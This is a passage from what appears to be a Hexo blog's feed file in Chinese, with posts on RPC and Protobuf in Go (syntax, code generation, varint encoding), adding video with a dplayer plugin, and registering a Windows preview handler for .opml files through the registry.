ID，然后传递给服务端，服务端也通过查表，来确定客户端所需要调用的函数，然后执行相应函数的代码。</li><li>序列化与反序列化。客户端如何把参数传递给远程调用的函数呢？在本地调用中，我们只需要把参数压到栈里，然后让函数自己去栈里读就行。但是在远程过程调用时，客户端跟服务端是不同的进程，不能通过内存来传递参数。甚至有时候客户端和服务端使用的都不是同一种语言（比如服务端用C++，客户端用Java或者Python）。这时候就需要客户端把参数先转成一个字节流，传给服务端后，再把字节流转成自己能读取的格式。这个过程叫序列化和反序列化。同理，从服务端返回的值也需要序列化反序列化的过程。</li><li>网络传输。远程调用往往用在网络上，客户端和服务端是通过网络连接的。所有的数据都需要通过网络传输，因此就需要有一个网络传输层。网络传输层需要把Call ID和序列化后的参数字节流传递给服务端，然后在把序列化后的调用结果传回给客户端，完成这种数据传递功能的被成为传输层。大部分的网络传输成都使用TCP协议，属于长连接。</li></ul></li></ul><p><img src="/images/pasted-32.png" alt="RPC原理图" /></p><h3 id="rpc涉及到的相关技术"><a class="markdownIt-Anchor" href="#rpc涉及到的相关技术"></a> RPC涉及到的相关技术</h3><ul><li>通过上文一系列的文字描述和讲解，我们已经了解了RPC的由来和RPC整个调用过程。我们可以看到RPC是一系列操作的集合，其中涉及到很多对数据的操作，以及网络通信。因此，我们对RPC中涉及到的技术做一个总结和分析：<ol><li>动态代理技术： 上文中我们提到的Client Stub和Sever Stub程序，在具体的编码和开发实践过程中，都是使用动态代理技术自动生成的一段程序。</li><li>序列化和反序列化： 在RPC调用的过程中，我们可以看到数据需要在一台机器上传输到另外一台机器上。在互联网上，所有的数据都是以字节的形式进行传输的。而我们在编程的过程中，往往都是使用数据对象，因此想要在网络上将数据对象和相关变量进行传输，就需要对数据对象做序列化和反序列化的操作。</li></ol><ul><li>序列化：把对象转换为字节序列的过程称为对象的序列化，也就是编码的过程。</li><li>反序列化：把字节序列恢复为对象的过程称为对象的反序列化，也就是解码的过程。</li></ul></li></ul><h2 id="golang官方rpc库"><a class="markdownIt-Anchor" href="#golang官方rpc库"></a> golang官方RPC库</h2><ul><li>在Go语言官方网站的<code>pkg</code>说明中，提供了官方支持的<code>rpc</code>包，<a href="https://golang.org/pkg/net/rpc">具体链接</a>。官方提供的<code>rpc</code>包完整的包名是：<code>net/rpc</code>。根据官方的解释，rpc包主要是提供通过网络访问一个对象方法的功能。</li></ul><h1 id="protobuf"><a class="markdownIt-Anchor" href="#protobuf"></a> Protobuf</h1><ul><li>在上述RPC的步骤实现中，可以看到其中有对传递的数据进行序列化和反序列化的操作，这就是我们本节内容开始要学习的内容：Protobuf。</li></ul><h2 id="protobuf简介"><a class="markdownIt-Anchor" href="#protobuf简介"></a> Protobuf简介</h2><ul><li>Google Protocol Buffer( 简称 Protobuf)是Google公司内部的混合语言数据标准，他们主要用于RPC系统和持续数据存储系统。</li></ul><h3 id="protobuf应用场景"><a class="markdownIt-Anchor" href="#protobuf应用场景"></a> Protobuf应用场景</h3><ul><li>Protocol Buffers 是一种轻便高效的结构化数据存储格式，可以用于结构化数据串行化，或者说序列化。它很适合做数据存储或RPC数据交换格式。可用于通讯协议、数据存储等领域的语言无关、平台无关、可扩展的序列化结构数据格式。</li><li>简单来说，Protobuf的功能类似于XML，即负责把某种数据结构的信息，以某种格式保存起来。主要用于数据存储、传输协议等使用场景。</li><li>为什么已经有了XLM，JSON等已经很普遍的数据传输方式，还要设计出Protobuf这样一种新的数据协议呢？</li></ul><h3 id="protobuf-优点"><a class="markdownIt-Anchor" href="#protobuf-优点"></a> Protobuf 优点</h3><ul><li>性能好/效率高<ul><li>时间维度：采用XML格式对数据进行序列化时，时间消耗上性能尚可；对于使用XML格式对数据进行反序列化时的时间花费上，耗时长，性能差。<br />空间维度：XML格式为了保持较好的可读性，引入了一些冗余的文本信息。所以在使用XML格式进行存储数据时，也会消耗空间。<br />整体而言，Protobuf以高效的二进制方式存储，比XML小3到10倍，快20到100倍。</li></ul></li></ul><h3 id="代码生成机制"><a class="markdownIt-Anchor" href="#代码生成机制"></a> 代码生成机制</h3><ul><li>代码生成机制的含义：在Go语言中，可以通过定义结构体封装描述一个对象，并构造一个新的结构体对象。比如定义Person结构体，并存放于Person.go文件：</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">type Person struct&#123;</span><br><span class="line">    Name string</span><br><span class="line">    Age int</span><br><span class="line">    Sex int</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>在分布式系统中，因为程序代码时分开部署，比如分别为A、B。A系统在调用B系统时，无法直接采用代码的方式进行调用，因为A系统中不存在B系统中的代码。因此，A系统只负责将调用和通信的数据以二进制数据包的形式传递给B系统，由B系统根据获取到的数据包，自己构建出对应的数据对象，生成数据对象定义代码文件。这种利用编译器，根据数据文件自动生成结构体定义和相关方法的文件的机制被称作代码生成机制。</p></li><li><p>代码生成机制的优点：首先，代码生成机制能够极大解放开发者编写数据协议解析过程的时间，提高工作效率；其次，易于开发者维护和迭代，当需求发生变更时，开发者只需要修改对应的数据传输文件内容即可完成所有的修改。</p></li><li><p>支持“向后兼容”和“向前兼容”</p><ul><li>向后兼容：在软件开发迭代和升级过程中，&quot;后&quot;可以理解为新版本，越新的版本越靠后；而“前”意味着早起的版本或者先前的版本。向“后”兼容即是说当系统升级迭代以后，仍然可以处理老版本的数据业务逻辑。</li><li>向前兼容：向前兼容即是系统代码未升级，但是接受到了新的数据，此时老版本生成的系统代码可以处理接收到的新类型的数据。</li></ul></li><li><p>支持前后兼容是非常重要的一个特点，在庞大的系统开发中，往往不可能统一完成所有模块的升级，为了保证系统功能正常不受影响，应最大限度保证通讯协议的向前兼容和向后兼容。</p></li><li><p>支持多种编程语言，Protobuf不仅仅Google开源的一个数据协议，还有很多种语言的开源项目实现。在Google官方发布的Protobuf的源代码中包含了C++、Java、Python三种语言。本系列课程中，我们学习如何实现Golang语言中的功能实现。</p></li></ul><h3 id="protobuf-缺点"><a class="markdownIt-Anchor" href="#protobuf-缺点"></a> Protobuf 缺点</h3><ul><li>可读性较差：为了提高性能，Protobuf采用了二进制格式进行编码。二进制格式编码对于开发者来说，是没办法阅读的。在进行程序调试时，比较困难。</li><li>缺乏自描述：诸如XML语言是一种自描述的标记语言，即字段标记的同时就表达了内容对应的含义。而Protobuf协议不是自描述的，Protobuf是通过二进制格式进行数据传输，开发者面对二进制格式的Protobuf，没有办法知道所对应的真实的数据结构，因此在使用Protobuf协议传输时，必须配备对应的proto配置文件。</li></ul><h2 id="go语言实现protobuf"><a class="markdownIt-Anchor" href="#go语言实现protobuf"></a> go语言实现Protobuf</h2><ul><li>Go语言中有对应的实现Protobuf协议的库，<a href="https://github.com/golang/protobuf">Github地址</a></li></ul><h3 id="环境准备"><a class="markdownIt-Anchor" href="#环境准备"></a> 环境准备</h3><ol><li>安装protobuf编译器。</li></ol><ul><li>可以在<a href="https://github.com/protocolbuffers/protobuf/releases">地址</a>选择适合自己系统的Proto编译器程序进行下载并解压，如图：</li></ul><p><img src="/images/pasted-25.png" alt="Protoc编译器" /></p><ol start="2"><li>配置环境变量</li></ol><ul><li>protoc编译器正常运行需要进行环境变量配置，将protocke执行文件所在目录添加到当前系统的环境变量中。windows系统下可以直接在Path目录中进行添加；macOS系统下可以将protoc可执行文件拷贝至/usr/local/include目录下。具体的对应的系统的环境变量配置可以阅读解压后与bin目录同级的readme.txt的文件内容。</li></ul><h3 id="安装"><a class="markdownIt-Anchor" href="#安装"></a> 安装</h3><ul><li>通过如下命令安装protoc-gen-go库：</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">go get github.com&#x2F;golang&#x2F;protobuf&#x2F;protoc-gen-go</span><br></pre></td></tr></table></figure><ul><li>安装完成以后，protoc-gen-go*可执行文件在本地环境GOPATH/bin目录下，如下图所示：<br /><img src="/images/pasted-26.png" alt="protoc-gen-go执行文件" /></li></ul><h3 id="protobuf-协议语法"><a class="markdownIt-Anchor" href="#protobuf-协议语法"></a> Protobuf 协议语法</h3><h4 id="protobuf-协议的格式"><a class="markdownIt-Anchor" href="#protobuf-协议的格式"></a> Protobuf 协议的格式</h4><ul><li>Protobuf协议规定：使用该协议进行数据序列化和反序列化操作时，首先定义传输数据的格式，并命名为以&quot;.proto&quot;为扩展名的消息定义文件。</li></ul><h3 id="message-定义一个消息"><a class="markdownIt-Anchor" href="#message-定义一个消息"></a> message 定义一个消息</h3><ul><li>先来看一个非常简单的例子。假设想定义一个“订单”的消息格式，每一个“订单&quot;都含有一个订单号ID、订单金额Num、订单时间TimeStamp字段。可以采用如下的方式来定义消息类型的.proto文件：</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">message Order&#123;</span><br><span class="line">    required string order_id &#x3D; 1;</span><br><span class="line">    required int64 num &#x3D; 2;</span><br><span class="line">    optional int32 timestamp &#x3D; 3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>Order消息格式有3个字段，在消息中承载的数据分别对应每一个字段。其中每个字段都有一个名字和一种类型。</p><ul><li>指定字段类型：在proto协议中，字段的类型包括字符串（string)、整形（int32、int64…）、枚举（enum）等数据类型</li><li>分配标识符：在消息字段中，每个字段都有唯一的一个标识符。最小的标识号可以从1开始，最大到536870911。不可以使用其中的[19000－19999]的标识号， Protobuf协议实现中对这些进行了预留。如果非要在.proto文件中使用这些预留标识号，编译时就会报警。</li><li>指定字段规则：字段的修饰符包含三种类型，分别是：<ul><li>required：一个格式良好的消息一定要含有1个这种字段。表示该值是必须要设置的；</li><li>optional：消息格式中该字段可以有0个或1个值（不超过1个）。</li><li>repeated：在一个格式良好的消息中，这种字段可以重复任意多次（包括0次）。重复的值的顺序会被保留。表示该值可以重复，相当于Go中的slice。</li></ul></li></ul></li><li><p>【注意：】使用required弊多于利；在实际开发中更应该使用optional和repeated而不是required。</p><ul><li>添加更多消息类型:在同一个.proto文件中，可以定义多个消息类型。多个消息类型分开定义即可。</li></ul></li></ul><h3 id="使用-protobuf-的步骤"><a class="markdownIt-Anchor" href="#使用-protobuf-的步骤"></a> 使用 Protobuf 的步骤</h3><ul><li>创建扩展名为.proto的文件，并编写代码。比如创建person.proto文件，内容如下：</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">syntax &#x3D; &quot;proto2&quot;;</span><br><span class="line">package example;</span><br><span class="line">message Person &#123;</span><br><span class="line">    required string Name &#x3D; 1;</span><br><span class="line">    required int32 Age &#x3D; 2;</span><br><span class="line">    required string From &#x3D; 3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>编译.proto文件，生成Go语言文件。执行如下命令：</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">protoc --go_out &#x3D; . test.proto</span><br></pre></td></tr></table></figure><ul><li><p>执行<code>protoc –go_out=. test.proto</code>生成对应的<code>person.pb.go</code>文件。并构建对应的<code>example</code>目录，存放生成的<code>person.pb.go</code>文件。</p></li><li><p>在程序中使用Protobuf<br />在程序中有如下代码：</p></li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">package main</span><br><span class="line">import (</span><br><span class="line">    &quot;fmt&quot;</span><br><span class="line">    &quot;ProtocDemo&#x2F;example&quot;</span><br><span class="line">    &quot;github.com&#x2F;golang&#x2F;protobuf&#x2F;proto&quot;</span><br><span class="line">    &quot;os&quot;</span><br><span class="line">)</span><br><span class="line">func main() &#123;</span><br><span class="line">fmt.Println(&quot;Hello World. \n&quot;)</span><br><span class="line">msg_test :&#x3D; &amp;example.Person&#123;</span><br><span class="line">Name: proto.String(&quot;Davie&quot;),</span><br><span class="line">Age:  proto.Int(18),</span><br><span class="line">From: proto.String(&quot;China&quot;),</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;序列化</span><br><span class="line">msgDataEncoding, err :&#x3D; proto.Marshal(msg_test)</span><br><span class="line">if err !&#x3D; nil &#123;</span><br><span class="line">panic(err.Error())</span><br><span class="line">return</span><br><span class="line">&#125;</span><br><span class="line">msgEntity :&#x3D; example.Person&#123;&#125;</span><br><span class="line">err &#x3D; proto.Unmarshal(msgDataEncoding, &amp;msgEntity)</span><br><span class="line">if err !&#x3D; nil &#123;</span><br><span class="line">fmt.Println(err.Error())</span><br><span class="line">os.Exit(1)</span><br><span class="line">return</span><br><span class="line">&#125;</span><br><span class="line">fmt.Printf(&quot;姓名：%s\n\n&quot;, msgEntity.GetName())</span><br><span class="line">fmt.Printf(&quot;年龄：%d\n\n&quot;, msgEntity.GetAge())</span><br><span class="line">fmt.Printf(&quot;国籍：%s\n\n&quot;, msgEntity.GetFrom())</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>执行程序</li></ul><p><img src="/images/pasted-27.png" alt="执行程序" /></p><h2 id="protobuf-协议语法-2"><a class="markdownIt-Anchor" href="#protobuf-协议语法-2"></a> Protobuf 协议语法</h2><ul><li><p>message：Protobuf中定义一个数据结构需要用到关键字message，这一点和Java的class，Go语言中的struct类似。</p></li><li><p>标识号：在消息的定义中，每个字段等号后面都有唯一的标识号，用于在反序列化过程中识别各个字段的，一旦开始使用就不能改变。标识号从整数1开始，依次递增，每次增加1，标识号的范围为1~2^29 – 1，其中[19000-19999]为Protobuf协议预留字段，开发者不建议使用该范围的标识号；一旦使用，在编译时Protoc编译器会报出警告。</p></li><li><p>字段规则：字段规则有三种：</p><ol><li>required：该规则规定，消息体中该字段的值是必须要设置的。</li><li>optional：消息体中该规则的字段的值可以存在，也可以为空，optional的字段可以根据defalut设置默认值。</li><li>repeated：消息体中该规则字段可以存在多个（包括0个），该规则对应java的数组或者go语言的slice。</li></ol></li><li><p>数据类型：常见的数据类型与protoc协议中的数据类型映射如下：</p></li></ul><p><img src="/images/pasted-28.png" alt="数据类型映射" /></p><ul><li>枚举类型：proto协议支持使用枚举类型，和正常的编程语言一样，枚举类型可以使用enum关键字定义在.proto文件中：</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">enum Age&#123;</span><br><span class="line">    male&#x3D;1;</span><br><span class="line">    female&#x3D;2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>字段默认值：.proto文件支持在进行message定义时设置字段的默认值，可以通过default进行设置，如下所示：</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">message Address &#123;</span><br><span class="line">    required sint32 id &#x3D; 1 [default &#x3D; 1];</span><br><span class="line">    required string name &#x3D; 2 [default &#x3D; &#39;北京&#39;];</span><br><span class="line">    optional string pinyin &#x3D; 3 [default &#x3D; &#39;beijing&#39;];</span><br><span class="line">    required string address &#x3D; 4;</span><br><span class="line">    required bool flag &#x3D; 5 [default &#x3D; true];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>导入：如果需要引用的message是写在别的.proto文件中，可以通过import &quot;xxx.proto&quot;来进行引入：</p></li><li><p>嵌套：message与message之间可以嵌套定义，比如如下形式：</p></li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">syntax &#x3D; &quot;proto2&quot;;</span><br><span class="line">package example;</span><br><span class="line">message Person &#123;</span><br><span class="line">    required string Name &#x3D; 1;</span><br><span class="line">    required int32 Age &#x3D; 2;</span><br><span class="line">    required string From &#x3D; 3;</span><br><span class="line">    optional Address Addr &#x3D; 4;</span><br><span class="line">    message Address &#123;</span><br><span class="line">        required sint32 id &#x3D; 1;</span><br><span class="line">        required string name &#x3D; 2;</span><br><span class="line">        optional string pinyin &#x3D; 3;</span><br><span class="line">        required string address &#x3D; 4;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>message更新规则：message定义以后如果需要进行修改，为了保证之前的序列化和反序列化能够兼容新的message，message的修改需要满足以下规则：<ul><li>不可以修改已存在域中的标识号。</li><li>所有新增添的域必须是 optional 或者 repeated。</li><li>非required域可以被删除。但是这些被删除域的标识号不可以再次被使用。</li><li>非required域可以被转化，转化时可能发生扩展或者截断，此时标识号和名称都是不变的。</li><li>sint32和sint64是相互兼容的。</li><li>fixed32兼容sfixed32。 fixed64兼容sfixed64。</li><li>optional兼容repeated。发送端发送repeated域，用户使用optional域读取，将会读取repeated域的最后一个元素。</li><li>Protobuf 序列化后所生成的二进制消息非常紧凑，这得益于 Protobuf 采用的非常巧妙的 Encoding 方法。接下来看一看Protobuf协议是如何实现高效编码的。</li></ul></li></ul><h2 id="protobuf序列化原理"><a class="markdownIt-Anchor" href="#protobuf序列化原理"></a> Protobuf序列化原理</h2><ul><li>之前已经做过描述，Protobuf的message中有很多字段，每个字段的格式为：修饰符 字段类型 字段名 = 域号;</li></ul><h3 id="varint"><a class="markdownIt-Anchor" href="#varint"></a> Varint</h3><ul><li><p>Varint是一种紧凑的表示数字的方法。它用一个或多个字节来表示一个数字，值越小的数字使用越少的字节数。这能减少用来表示数字的字节数。</p></li><li><p>Varint中的每个byte的最高位bit有特殊的含义，如果该位为1，表示后续的byte也是该数字的一部分，如果该位为0，则结束。其他的7个bit都用来表示数字。因此小于128的数字都可以用一个byte表示。大于128的数字，比如300，会用两个字节来表示：1010 1100 0000 0010。下图演示了 Google Protocol Buffer 如何解析两个bytes。注意到最终计算前将两个byte的位置相互交换过一次，这是因为 Google Protocol Buffer 字节序采用little-endian的方式。<br /><img src="/images/pasted-29.png" alt="小端位序排列的Varint编码" /></p></li><li><p>在序列化时，Protobuf按照TLV的格式序列化每一个字段，T即Tag，也叫Key；V是该字段对应的值value；L是Value的长度，如果一个字段是整形，这个L部分会省略。</p></li><li><p>序列化后的Value是按原样保存到字符串或者文件中，Key按照一定的转换条件保存起来，序列化后的结果就是 KeyValueKeyValue…依次类推的样式，示意图如下所示：</p></li></ul><p><img src="/images/pasted-30.png" alt="序列化后的Value" /></p><ul><li>采用这种Key-Pair结构无需使用分隔符来分割不同的Field。对于可选的Field，如果消息中不存在该field，那么在最终的Message Buffer中就没有该field，这些特性都有助于节约消息本身的大小。比如，我们有消息order1:</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Order.id &#x3D; 10;</span><br><span class="line">Order.desc &#x3D; &quot;bill&quot;;</span><br></pre></td></tr></table></figure><ul><li>则最终的 Message Buffer 中有两个Key-Value对，一个对应消息中的id；另一个对应desc。Key用来标识具体的field，在解包的时候，Protocol Buffer根据Key就可以知道相应的Value应该对应于消息中的哪一个field。</li><li>Key 的定义如下：</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(field_number &lt;&lt; 3) | wire_type</span><br></pre></td></tr></table></figure><ul><li>可以看到 Key 由两部分组成。第一部分是 field_number，比如消息lm.helloworld中field id 的field_number为1。第二部分为wire_type。表示 Value的传输类型。而wire_type有以下几种类型：</li></ul><p><img src="/images/pasted-31.png" alt="wire_type类型" /></p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> programme </category>
          
      </categories>
      
      
        <tags>
            
            <tag> golang </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>添加视频</title>
      <link href="/2020/06/23/%E5%8A%A0%E8%A7%86%E9%A2%91/"/>
      <url>/2020/06/23/%E5%8A%A0%E8%A7%86%E9%A2%91/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><blockquote><p>添加视频</p></blockquote><a id="more"></a><ul><li>hexo添加音乐、视频，有两种方法，一种是引入网站提供的iframe标签，还有一种是使用插件。</li></ul><h2 id="安装视频插件"><a class="markdownIt-Anchor" href="#安装视频插件"></a> 安装视频插件</h2><ul><li>跟音乐标签一样可以使用插件，详细使用方法可以查看：<a href="https://github.com/NextMoe/hexo-tag-dplayer">dplayer插件</a></li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install hexo-tag-dplayer --save</span><br></pre></td></tr></table></figure><h2 id="页面添加资源"><a class="markdownIt-Anchor" href="#页面添加资源"></a> 页面添加资源</h2><ul><li>在markdown添加下面代码</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% dplayer &quot;url&#x3D;video.mp4&quot;  &quot;pic&#x3D;picture.jpg&quot; &quot;loop&#x3D;yes&quot; &quot;theme&#x3D;#FADFA3&quot; &quot;autoplay&#x3D;false&quot; &quot;token&#x3D;tokendemo&quot; %&#125;</span><br></pre></td></tr></table></figure><div id="dplayer0" class="dplayer hexo-tag-dplayer-mark" style="margin-bottom: 20px;"></div><script>(function(){var player = new DPlayer({"container":document.getElementById("dplayer0"),"theme":"#FADFA3","loop":true,"video":{"url":"/video/jelly.mov"}});window.dplayers||(window.dplayers=[]);window.dplayers.push(player);})()</script><div id="dplayer1" class="dplayer hexo-tag-dplayer-mark" style="margin-bottom: 20px;"></div><script>(function(){var player = new DPlayer({"container":document.getElementById("dplayer1"),"theme":"#FADFA3","loop":true,"video":{"url":"/video/mojito.mov"}});window.dplayers||(window.dplayers=[]);window.dplayers.push(player);})()</script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> common </category>
          
      </categories>
      
      
        <tags>
            
            <tag> skills </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>windows增加预览</title>
      <link href="/2020/06/22/indows%E5%A2%9E%E5%8A%A0%E9%A2%84%E8%A7%88/"/>
      <url>/2020/06/22/indows%E5%A2%9E%E5%8A%A0%E9%A2%84%E8%A7%88/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><blockquote><p>给windows增加预览功能</p></blockquote><a id="more"></a><h2 id="什么是文件预览"><a class="markdownIt-Anchor" href="#什么是文件预览"></a> 什么是文件预览</h2><ul><li>在<code>windows</code>中已经创建关联的情况下，双击文件可以调用默认的应用程序进行浏览和编辑。从<code>Windows Vista</code>开始，操作系统提供了非常实用的预览功能，激活“预览窗格”之后，可以在资源管理器中直接预览文档内容。到了<code>Windows 8/8.1</code>、<code>Windows 10</code>，文件预览功能更为强大，不仅支持图片、音频、视频文件的预览，而且.可以直接预览<code>Office</code>档、文本、字体、网页乃至<code>PDF</code>文件和<code>E-mail</code>。</li></ul><h2 id="如何激活预览功能"><a class="markdownIt-Anchor" href="#如何激活预览功能"></a> 如何激活预览功能</h2><ul><li>激活的快捷键：<code>Alt + p</code></li><li>手动操作：<code>打开“计算机”或“资源管理器”窗口→查看→窗格→预览窗格</code></li><li>打开后，单机文件就可以查看相应内容。</li><li>如果这个设置没有应用到所有文件夹，那么请在打开预览窗格的前提下：<code>查看→选项→文件夹选项→查看→应用到文件夹</code></li></ul><h2 id="手动添加预览文件类型"><a class="markdownIt-Anchor" href="#手动添加预览文件类型"></a> 手动添加预览文件类型</h2><ul><li>有时<code>windows</code>默认注册的预览器，并不能满足我们的要求，我们可以通过修改注册表的方式，手动关联预览器。</li><li>有很多文件在windows中不支持预览，非常不方便，我们可以在注册表手工增加。需要将文件后缀注册到windows中。下面我们以<code>.opml</code>文件为例，关联一个预览器。</li></ul><h3 id="查看已注册的预览器"><a class="markdownIt-Anchor" href="#查看已注册的预览器"></a> 查看已注册的预览器</h3><ul><li>实现预览功能，必须首先注册的预览器，然后绑定文件后缀，才能实现。我们可以通过注册表查看已经注册的预览器。</li><li>运行窗口输入：<code>regedit</code>，打开注册表，调转至：<code>HKEY_LOCAL_MACHINE＼SOFTWARE＼Microsoft＼Windows＼CurrentVersion＼PreviewHandlers</code>，右侧窗格列出了操作系统已注册的所有预览器。</li><li>我们可以从<code>数据</code>列查看预览器的名称，对应的值就是预览器的操作符。</li></ul><table><thead><tr><th>名称</th><th>值</th><th>说明</th></tr></thead><tbody><tr><td>Windows Media Player Rich Preview Handler</td><td>{031EE060-67BC-460d-8847-E4A7C5E45A27}</td><td>预览音频、视频格式的媒体文件，这也是在文件资源管理器可以直接实现播放的原因所在</td></tr><tr><td>Windows TXT Previewer</td><td>{1531d583-8375-4d3f-b5fb-d23bbd169f22}</td><td>实现对于.txt、.reg、.bat等文本文件的预览</td></tr><tr><td>Windows Font previewer</td><td>{8a7cae0e-5951-49cb-bf20-ab3fa1e44b01}</td><td>预览字体文件</td></tr><tr><td>Windows RTF Previewer</td><td>{a42c2ccb-67d3-46fa-abe6-7d2f3488c7a3}</td><td>用于预览RTF文档</td></tr><tr><td>Windows Excel预览器</td><td>{00020827-0000-0000-C000-000000000046}</td><td>用于实现Office文档的预览功能</td></tr><tr><td>Microsoft Windows Mail Html Preview Handler</td><td>{f8b8412b-dea3-4130-b36c-5e8be73106ac}</td><td>预览html文件</td></tr><tr><td>Microsoft Visio previewer</td><td>{21E17C2F-AD3A-4b89-841F-09CFE02D16B7}</td><td>预览visio文件</td></tr><tr><td>Microsoft PowerPoint previewer</td><td>{65235197-874B-4A07-BDC5-E65EA825B718}</td><td>预览ppt</td></tr><tr><td>Microsoft Word previewer</td><td>{84F66100-FF7C-4fb4-B0C0-02CD7FB668FE}</td><td>预览word</td></tr><tr><td>Microsoft Excel previewer</td><td>{00020827-0000-0000-C000-000000000046}</td><td>Excel</td></tr><tr><td>Foxit PDF Preview Provider (XP)</td><td>{1B96FAD8-1C10-416E-8027-6EFF94045F6F}</td><td>FoxitReaderPlus.Document{E357FCCD-A995-4576-B01F-234630154E96}-{21F5E992-636E-48DC-9C47-5B05DEF82372}</td></tr><tr><td>Foxit PDF Preview Handler</td><td>{FFBD7029-84D7-4E1E-BE44-B6619BC545ED}</td><td>PDF</td></tr></tbody></table><ul><li>这些都是<code>Windows 10</code>自带的预览器。除此之外，这里也会列出很多第三方程序提供的预览器。像PDF文档的预览器，在安装<code>Adobe</code>时，程序会自动注册预览器，将<code>pdf</code>文件与之关联。</li><li><code>.opml</code>文件我们选择<code>Windows TXT Previewer</code>作为默认预览器，将<code>&#123;1531d583-8375-4d3f-b5fb-d23bbd169f22&#125;</code>数值名称复制到剪贴板备用。</li></ul><h3 id="注册文件格式"><a class="markdownIt-Anchor" href="#注册文件格式"></a> 注册文件格式</h3><ul><li>打开注册表，右键<code>HKEY_CLASSES_ROOT＼</code>；</li><li>从快捷菜单中选择<code>新建→项</code>，手工新建一个名为<code>.opml</code>的项，双击右侧窗格的<code>默认</code>二进制值，将其数值名称设置为<code>opmlfile</code>；</li><li>仍然右击<code>HKEY_CLASSES_ROOT</code>，手工新建一个名为<code>opmlfile</code>的项，创建一个名为<code>shellex</code>的子项，如果<code>HKEY_CLASSES_ROOT＼</code>下已经有相应的项目，那么这一步骤可以省略；</li><li>右击<code>shellex</code>，创建一个名为<code>&#123;8895b1c6-b41f-4c1c-a562-0d564250836f&#125;</code>的子项，这个子项的作用是向文件资源管理器报告该类型的文件可以被预览。</li></ul><h3 id="分配预览器"><a class="markdownIt-Anchor" href="#分配预览器"></a> 分配预览器</h3><ul><li>单击选中<code>&#123;8895b1c6-b41f-4c1c-a562-0d564250836f&#125;</code>项，此时右侧窗格中会有一个<code>默认</code>的值，双击打开<code>编辑字符串</code>对话框，将其数值数据设置为<code>&#123;1531d583-8375-4d3f-b5fb-d23bbd169f22&#125;</code>，也就是说为<code>.opml</code>文件分配<code>Windows TXT Previewer</code>预览器，在注册表编辑器中执行刷新操作，或者直接关闭窗口。</li></ul><blockquote><p>完成上述操作之后，现在我们就可以在文件资源管理器直接预览.opml格式的文件，此时看到的就不再只是冷冰冰的<code>没有预览</code>的提示信息了。按照类似的步骤，我们在正确选择预览器、注册文件格式之后，记住<code>“有子项直接编辑，无子项手工创建”</code>这句话即可，很快就可以让<code>Windows 10</code>正常预览相应格式的文件。<br />最近发现不需要新建opmlfile项，直接在.opml下新建shellex即可，也同样能达到预览的效果。</p></blockquote><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> common </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据类型</title>
      <link href="/2020/06/21/%E6%8D%AE%E7%B1%BB%E5%9E%8B/"/>
      <url>/2020/06/21/%E6%8D%AE%E7%B1%BB%E5%9E%8B/</url>
      
